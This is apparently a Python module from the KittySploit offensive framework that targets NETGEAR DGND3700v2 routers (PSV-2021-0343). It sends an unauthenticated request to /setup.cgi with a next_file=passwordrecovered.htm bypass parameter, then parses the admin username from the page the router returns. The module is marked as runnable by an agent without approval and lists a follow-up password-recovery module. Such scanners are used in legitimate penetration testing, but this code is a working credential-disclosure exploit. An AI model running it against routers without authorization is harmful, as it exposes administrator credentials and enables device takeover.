#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""NETGEAR DGND3700v2 unauthenticated admin password recovery (PSV-2021-0343)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'NETGEAR DGND3700v2 - Password Recovery Detection (PSV-2021-0343)',
        'description': (
            'NETGEAR DGND3700v2 exposes admin credentials via '
            '/setup.cgi?next_file=passwordrecovered.htm without authentication '
            '(PSV-2021-0343).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'netgear', 'router', 'credentials', 'exposure',
            'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'auxiliary/admin/http/netgear_dgnd3700_password_recover',
                ],
            },
        },
        'references': [
            'https://kb.netgear.com/000064760/Security-Advisory-for-Multiple-Vulnerabilities-on-DGND3700v2-PSV-2021-0343',
        ],
    }

    def run(self):
        path = '/setup.cgi?next_file=passwordrecovered.htm&foo=currentsetting.htm'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ''
        if (
            'You have successfully recovered the admin password.' in body
            and 'Router Admin Password' in body
        ):
            user = re.search(
                r'Router Admin Username</span>:[^;]+;([^<]+)<', body
            )
            self.set_info(
                severity='critical',
                reason='NETGEAR DGND3700v2 unauthenticated password recovery',
                path=path,
                username=(user.group(1).strip() if user else ''),
            )
            return True
        return False
